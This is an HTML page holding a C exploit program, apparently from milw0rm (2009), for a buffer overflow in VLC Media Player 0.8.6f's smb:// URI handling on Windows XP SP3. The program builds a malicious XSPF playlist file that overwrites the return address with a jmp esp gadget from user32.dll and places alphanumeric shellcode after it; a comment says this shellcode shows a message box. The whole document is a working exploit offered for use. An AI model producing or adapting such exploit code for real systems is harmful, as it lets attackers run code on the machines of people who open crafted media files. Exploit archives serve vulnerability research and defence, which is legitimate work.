<html><head><title>VLC Media Player 0.8.6f smb:// URI Handling Remote BOF Exploit</title></head><pre>/*  VLC Media Player 'smb://' URI Handling Remote Buffer Overflow Vulnerability Exploit
 *  Reference: http://www.securityfocus.com/bid/35500
 *
 *  Tested on VLC media player 0.8.6f on WinXP SP3
 *   
 *  Coded by Pankaj Kohli
 *  http://www.pank4j.com
 *
 */
 
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
 
// ASCII shellcode (Display a message box &amp; exit)
unsigned char shell[] = &quot;TY777777777777777777777777777777777QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIXkweaHrJwpf02pQzePMhyzWwSuQnioXPOHuBxKnaQlkOjpJHIvKOYokObPPwRN1uqt5PA&quot;;
 
long jmp = 0x7E485233;  // jmp esp (user32.dll)
 
int main(int argc, char **argv) {
    char buff[512], *p;
    FILE *fp;
    int i;
    long *ptr;
 
    fp = fopen(&quot;sploit.xspf&quot;, &quot;wb&quot;);
    fprintf(fp, &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;);
    fprintf(fp, &quot;&lt;playlist version=\&quot;1\&quot; xmlns=\&quot;http://xspf.org/ns/0/\&quot; xmlns:vlc=\&quot;http://www.videolan.org/vlc/playlist/ns/0/\&quot;&gt;\n&quot;);
    fprintf(fp, &quot;\t&lt;title&gt;Playlist&lt;/title&gt;\n&quot;);
    fprintf(fp, &quot;\t&lt;trackList&gt;\n&quot;);
    fprintf(fp, &quot;\t\t&lt;track&gt;\n&quot;);
    fprintf(fp, &quot;\t\t\t&lt;location&gt;smb://example.com@www.example.com/foo/#{&quot;);
    
    printf(&quot;[*] Creating buffer\n&quot;);
    for(i=0; i&lt;300; i++) {
        buff[i] = 'a' + ((i/4)%26);
    }
    ptr = (long *) (buff + 96);
    *ptr = jmp;
    for(i=0; i&lt;strlen((const char *) shell); i++) {
        buff[i+100] = shell[i];
    }
    buff[300] = 0;
    fprintf(fp, &quot;%s&quot;, buff);
    
    fprintf(fp, &quot;}&lt;/location&gt;\n&quot;);
    fprintf(fp, &quot;\t\t\t&lt;extension application=\&quot;http://www.videolan.org/vlc/playlist/0\&quot;&gt;\n&quot;);
    fprintf(fp, &quot;\t\t\t\t&lt;vlc:id&gt;0&lt;/vlc:id&gt;\n&quot;);
    fprintf(fp, &quot;\t\t\t&lt;/extension&gt;\n&quot;);
    fprintf(fp, &quot;\t\t&lt;/track&gt;\n&quot;);
    fprintf(fp, &quot;\t&lt;/trackList&gt;\n&quot;);
    fprintf(fp, &quot;&lt;/playlist&gt;\n&quot;);
    fclose(fp);
     
    printf(&quot;[*] Exploit file written to sploit.xspf\n&quot;);
     
    return 0;
}

// milw0rm.com [2009-07-30]</pre></html>